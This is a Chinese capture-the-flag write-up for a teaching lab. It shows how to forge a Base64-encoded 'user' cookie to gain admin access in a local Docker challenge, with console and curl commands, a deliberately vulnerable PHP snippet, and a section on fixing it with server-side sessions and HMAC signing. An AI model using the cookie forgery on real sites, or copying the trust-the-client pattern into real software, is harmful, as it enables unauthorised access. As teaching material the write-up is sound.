# 题解：个人中心（Cookie 伪造 · Base64 编码）

> 对应课件 p20「Cookie / Session」、p48「编码、加密、哈希」、p35「越权」。

## 一、题目与考点

| 项 | 值 |
|---|---|
| 考点 | Cookie 与会话、**Base64 编码识别与生成**、可信边界 |
| 难度 | 1 |
| 端口 | 8085 |
| Flag 格式 | `flag{...}` |

一句话：服务器**直接信任** Cookie 里那个「身份」，但它不是明文 —— 是 **Base64 编码**后的。
你要做的不是猜，而是**把 `admin` 编码成一样的形式**，在原有 Cookie 上换个值。

> 你说你是管理员？**我要验牌** —— 可这张牌是你自己写的，而且只是换了个写法。

## 二、启动环境

> ⚠️ **Windows PowerShell 5.1 用户注意**：`curl` 在那里是 `Invoke-WebRequest` 的别名，
> 敲 `curl -H "A: B"` 会报「无法绑定参数 Headers」。请改用 **`curl.exe`**（Windows 10 1803+ 自带）。
> 完整命令对照表见总 README 的「**在 Windows 上怎么敲这些命令**」一节。

```bash
cd cookie-ctf
docker compose up -d --build
# 浏览器打开 http://127.0.0.1:8085/
```

## 三、手把手解题

### Step 1｜第一次访问，服务器已经给你一块牌

打开首页，F12 → Application → Cookies（或 Console 里敲 `document.cookie`）：

```
user=Z3Vlc3Q=
```

这就是「你现有的 Cookie」。页面提示：

> 普通用户只能看到自己的名字。
> 你说你是管理员？**我要验牌** —— 可服务器手上根本没有你的档案。
> 它唯一的依据就是你发来的 Cookie，而且它**会先把值解码，再拿去比对身份**。
> 你现在发的是 `user=Z3Vlc3Q=` —— 这一串解码出来就是 `guest`。

> 如果你的浏览器里还留着上一版的 `role` Cookie，请先删掉：
> `document.cookie = "role=; Max-Age=0; path=/"`。新版只看 `user`。

### Step 2｜认出这是 Base64

`Z3Vlc3Q=` 有三个特征：只有 `A-Za-z0-9+/`、**以 `=` 结尾**（补位符）、长度是 4 的倍数。

解一下看：

```bash
echo 'Z3Vlc3Q=' | base64 -d
# guest
```

PowerShell：

```powershell
[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z3Vlc3Q='))
# guest
```

确认了：**Cookie 的值 = 身份的 Base64 编码**。

### Step 3｜把 `admin` 编码成同样形式

```bash
echo -n 'admin' | base64
# YWRtaW4=
```

> 一定要 `-n`（不输出结尾换行），否则编码的是 `admin\n`，结果就变了。

PowerShell：

```powershell
[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('admin'))
# YWRtaW4=
```

### Step 4｜**在原有 Cookie 上改一个值**，刷新

浏览器控制台：

```javascript
document.cookie = "user=YWRtaW4=; path=/";
location.reload();
```

页面立刻变成管理员视图：

> 验完了，**牌没有问题** —— 管理员请进。

下面就是 Flag。

curl 版（一行）：

```bash
curl -s "http://127.0.0.1:8085/" -H "Cookie: user=YWRtaW4="
```

### Step 5｜错误尝试对照表（自己验证一遍最有收获）

| 你发的 Cookie | 能不能拿 flag | 解码后身份 | 说明 |
|---|---|---|---|
| 不带（首访） | ❌ | guest | 服务器会重新种一个 `Z3Vlc3Q=` |
| `user=Z3Vlc3Q=` | ❌ | guest | 原样不改，当然没用 |
| **`user=YWRtaW4=`** | ✅ | admin | 正确 |
| `user=YWRtaW4` | ✅ | admin | 少了补位的 `=` 也能解（PHP 宽容模式） |
| `user=admin` | ❌ | `i٢` | **编码不是装饰**，明文不会被当成 admin |
| `user=QWRtaW4=` | ❌ | `Admin` | 大小写敏感 |
| `role=admin` | ❌ | guest | 上一版的老解法，新版已经不认这个字段 |
| `user=YWRtaW4=; role=guest` | ✅ | admin | 多余的字段不影响 |

几个教学点：

1. **`=` 结尾 + 只有字母数字** → 基本可以判定是 Base64（这是课件 p48 讲的识别方法）
2. **`echo -n` 的坑**：多一个换行，编码结果完全不同 —— 真实比赛里这个坑踩死过很多人
3. **明文 `admin` 解出来是乱码**（`i٢`）—— 说明服务端真的在做解码，不是随便比较字符串
4. **老解法 `role=admin` 失效**：题目升级后，身份判据从一个字段换成了另一个字段的编码值

## 四、为什么能成（原理）

后台逻辑：

```php
// 第一次来：种一个 base64('guest')
setcookie('user', base64_encode('guest'), ['path' => '/']);

// 之后每次：解码 Cookie，然后直接信
$decoded  = base64_decode($_COOKIE['user'], false);
$identity = ($decoded === '' ) ? 'guest' : $decoded;

if ($identity === 'admin') { echo ctf_flag(); }
```

两个错误叠在一起：

| 错误 | 后果 |
|---|---|
| **身份存在客户端** | 客户端想填什么就填什么 |
| **以为「编码过」就等于「安全」** | Base64 没有密钥，谁都能编码，等于明文 |

Base64 只是**换个写法便于传输**，不是加密：

```bash
echo 'YWRtaW4=' | base64 -d     # 谁都解得开
```

正确做法：客户端只带一个**不可猜测的 session id**，身份放在**服务端会话**里。

## 五、怎么修（防御）

```php
// 正确：身份从服务端会话读，客户端只给会话标识
session_start();
if (!isset($_SESSION['user_id'])) { header('Location: /login.php'); exit; }
$role = $_SESSION['role'];          // ← 来自服务端，客户端改不了

// 如果非要把状态放客户端的 Cookie 里，必须签名（HMAC）
$payload = base64_encode(json_encode(['user' => $u, 'role' => $r]));
$sig     = hash_hmac('sha256', $payload, $SECRET_KEY);
setcookie('state', $payload . '.' . $sig, ['httponly' => true, 'samesite' => 'Lax']);
// 读的时候先验签，签名不对直接拒绝
```

- **别用 Base64 当保护**：编码 ≠ 加密 ≠ 校验
- 身份、权限**只从服务端会话**读
- Cookie 加 `HttpOnly`（本题故意不设，方便学生观察）、`Secure`、`SameSite`
- 关键操作二次校验（改密码要旧密码）

## 六、动态 Flag

`src/flag.inc.php` 优先读环境变量 `FLAG`（**明文**），未注入则首次请求自动生成随机 flag
并缓存到容器 `/tmp/.web_ctf_flag`。

```bash
FLAG=flag{your-dynamic-flag} docker compose up -d
```

验证：

```bash
curl -s "http://127.0.0.1:8085/" -H "Cookie: user=YWRtaW4=" | grep -o 'flag{[^}]*}'
docker exec cookie-ctf-web-1 cat /tmp/.web_ctf_flag      # 两者应一致
```
